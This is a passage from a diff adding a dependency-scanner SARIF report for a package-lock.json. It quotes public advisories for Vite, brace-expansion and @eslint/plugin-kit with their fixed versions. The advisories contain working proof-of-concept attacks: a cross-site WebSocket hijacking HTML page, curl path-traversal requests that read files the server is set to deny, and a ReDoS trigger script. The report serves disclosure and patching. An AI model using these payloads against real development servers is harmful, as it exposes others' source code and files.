[1]: Permissive default CORS settings\nUsers with the default `server.cors` option may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nAll users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.\n\nFor users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.\n\nFor users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUsers using HTTP for the development server and using a browser that is not Chrome 94+ may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\nChrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.\n\n### Related Information\nSafari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.\n\n### PoC\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n1. I used the `react` template which utilizes HMR functionality.\n\n```\nnpm create vite@latest my-vue-app-react -- --template react\n```\n\n2. Then on a malicious server, serve the following POC html:\n```html\n\u003c!doctype html\u003e\n\u003chtml lang=\"en\"\u003e\n    \u003chead\u003e\n        \u003cmeta charset=\"utf-8\" /\u003e\n        \u003ctitle\u003evite CSWSH\u003c/title\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        \u003cdiv id=\"logs\"\u003e\u003c/div\u003e\n        \u003cscript\u003e\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws://localhost:5173','vite-hmr');\n            ws.onmessage = event =\u003e {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        \u003c/script\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n\n3. Kick off Vite \n\n```\nnpm run dev\n```\n\n4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. \n5. Edit `src/App.jsx` file and intentionally place a syntax error\n6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed\n\nHere's a video demonstrating the POC:\n\nhttps://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "6.0.9",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-jqfw-vq24-v9c3",
+          "level": "note",
+          "message": {
+            "text": "### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" \u003e /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  \u003e  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" \u003e secret_files/secret.txt\necho \"secret html\" \u003e secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "7.1.5",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-g4jq-h2w9-997c",
+          "level": "note",
+          "message": {
+            "text": "### Summary\nFiles starting with the same name with the public directory were served bypassing the `server.fs` settings.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- uses [the public directory feature](https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)\n- a symlink exists in the public directory\n\n### Details\nThe [servePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' \u003e vite.config.js\necho  \"secret\" \u003e private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,  because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "7.1.5",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-v6h2-p8h4-qcjw",
+          "level": "note",
+          "message": {
+            "text": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "2.0.2",
+            "package": "brace-expansion",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "2.0.1"
+          }
+        },
+        {
+          "ruleId": "GHSA-v6h2-p8h4-qcjw",
+          "level": "note",
+          "message": {
+            "text": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "2.0.2",
+            "package": "brace-expansion",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "1.1.11"
+          }
+        },
+        {
+          "ruleId": "GHSA-xffm-g5w8-qvg7",
+          "level": "note",
+          "message": {
+            "text": "### Summary\n\nThe `ConfigCommentParser#parseJSONLikeConfig` API is vulnerable to a Regular Expression Denial of Service (ReDoS) attack in its only argument.\n\n### Details\n\nThe regular expression at [packages/plugin-kit/src/config-comment-parser.js:158](https://github.com/eslint/rewrite/blob/bd4bf23c59f0e4886df671cdebd5abaeb1e0d916/packages/plugin-kit/src/config-comment-parser.js#L158) is vulnerable to a quadratic runtime attack because the grouped expression is not anchored. This can be solved by prepending the regular expression with `[^-a-zA-Z0-9/]`.\n\n### PoC\n\n```javascript\nconst { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nconst str = `${\"A\".repeat(1000000)}?: 1 B: 2`;\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseJSONLikeConfig(str));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit@0.3.3` and `node attack.js`\n// then the program will stuck forever with high CPU usage\n```\n\n### Impact\n\nThis is a Regular Expression Denial of Service attack which may lead to blocking execution and high CPU usage."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "0.3.4",
+            "package": "@eslint/plugin-kit",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "0.2.3"
+          }
+        }
+      ]
+    }
+  ]
+}
